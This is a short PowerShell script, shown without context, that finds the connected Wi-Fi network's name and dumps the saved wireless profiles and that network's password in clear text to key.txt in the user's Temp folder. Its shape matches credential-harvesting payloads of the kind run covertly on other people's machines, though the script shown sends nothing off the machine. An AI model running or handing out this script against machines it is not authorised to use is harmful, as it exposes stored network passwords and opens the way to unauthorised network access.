cd AppData\Local\Temp
(netsh wlan show interface | Select-String SSID)[0] | %{
[String]$SSID=$_
$SSID=$SSID.replace("SSID","").replace(":","").trim()
netsh wlan show profiles > key.txt
netsh wlan show profile name=$SSID key=clear >> key.txt
}
